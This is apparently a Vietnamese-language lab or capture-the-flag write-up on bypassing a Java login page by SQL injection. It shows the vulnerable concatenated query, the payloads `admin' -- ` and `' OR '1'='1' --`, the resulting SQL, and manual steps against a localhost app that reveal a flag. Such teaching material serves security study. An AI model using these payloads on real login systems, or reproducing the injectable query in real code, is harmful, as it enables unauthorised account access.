# 🔓 Kỹ thuật Khai thác: Authentication Bypass via SQL Injection

## 1. Bản chất Lỗ hổng
Tại lớp `UserDAO.java`, phương thức `login()` thực thi truy vấn xác thực người dùng bằng cách ghép trực tiếp chuỗi:
```java
String sql = "SELECT id, username, password, email, role, secret_flag FROM users "
           + "WHERE username = '" + username + "' AND password = '" + password + "'";
rs = stmt.executeQuery(sql);
```

Kẻ tấn công có thể chèn các ký tự đặc biệt như `'` (nháy đơn) để đóng chuỗi SQL của ứng dụng trước thời hạn, sau đó chèn mệnh đề luận lý `OR '1'='1'` hoặc dấu chú thích comment (`-- `, `#`) để vô hiệu hóa hoàn toàn điều kiện kiểm tra mật khẩu `AND password = ...`.

## 2. Phân tích Truy vấn khi bị tấn công

Khi kẻ tấn công gửi:
- **Username:** `admin' -- `
- **Password:** `(bất kỳ)`

Câu truy vấn thực thi trên MySQL trở thành:
```sql
SELECT id, username, password, email, role, secret_flag FROM users WHERE username = 'admin' -- ' AND password = '...'
```
Dấu `-- ` khiến toàn bộ phần kiểm tra mật khẩu phía sau bị coi là chú thích (comment) và bị MySQL bỏ qua. Kết quả trả về đúng bản ghi của tài khoản `admin`.

Khi kẻ tấn công gửi:
- **Username:** `' OR '1'='1' -- `
- **Password:** `(bất kỳ)`

Câu truy vấn trở thành:
```sql
SELECT id, username, password, email, role, secret_flag FROM users WHERE username = '' OR '1'='1' -- ' AND password = '...'
```
Mệnh đề `'1'='1'` luôn đúng với mọi dòng dữ liệu. MySQL trả về tập kết quả chứa toàn bộ người dùng và ứng dụng lấy dòng đầu tiên (thường là User có ID 1 - `admin`).

## 3. Các bước khai thác thủ công
1. Truy cập giao diện `http://localhost:8080/login.jsp`.
2. Tại ô **Username**, nhập: `admin' -- ` (lưu ý có khoảng trắng sau 2 dấu gạch nối).
3. Tại ô **Password**, nhập bất kỳ chuỗi nào (ví dụ: `123456`).
4. Nhấn **Đăng nhập**.
5. Quan sát ứng dụng chuyển hướng về `index.jsp` và hiển thị thông tin Role `admin` kèm theo cờ bí mật: `FLAG{sqli_admin_bypass_master_2026}`.

## 4. Chạy Script khai thác tự động
```bash
python exploit.py
```
Script sẽ tự động gửi HTTP POST request và kiểm tra trạng thái session cookie.
